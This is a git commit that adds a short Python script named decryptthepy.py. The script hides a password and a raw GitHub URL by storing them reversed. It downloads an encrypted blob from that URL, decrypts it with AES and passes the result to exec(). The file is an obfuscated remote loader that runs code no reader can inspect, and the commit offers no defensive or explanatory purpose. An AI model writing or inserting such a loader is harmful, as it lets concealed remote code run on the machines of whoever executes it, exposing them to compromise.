ef8e6fe7f25cac2c8c5bf56d3a0f34479f4c5f3f
R.B.C. <musicmancorley@gmail.com>
2026-04-03 16:01:05 -0400

    Add files via upload

---
+++ decryptthepy.py
@@ -0,0 +1,27 @@
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+import encodings.idna
+import ssl
+import urllib.request
+
+# Your password (must match encryptor)
+thechallenge = b"6202desreveR"
+thechallenge=thechallenge[::-1]
+
+SCODE_U = "detpyrcne.tpircs_ruoy/niam/sdaeh/sfer/radarehtrednu/m3tsyst3g/moc.tnetnocresubuhtig.war//:sptth"
+encrypted_data=urllib.request.urlopen(SCODE_U[::-1]).read()
+
+# Extract salt, IV, and ciphertext
+salt = encrypted_data[:16]
+iv = encrypted_data[16:32]
+ciphertext = encrypted_data[32:]
+
+# Derive key
+key = PBKDF2(thechallenge, salt, dkLen=32, count=100000)
+
+# Decrypt
+cipher = AES.new(key, AES.MODE_CBC, iv)
+plaintext = cipher.decrypt(ciphertext).rstrip(b'\0')
+
+# Execute decrypted script
+exec(plaintext)
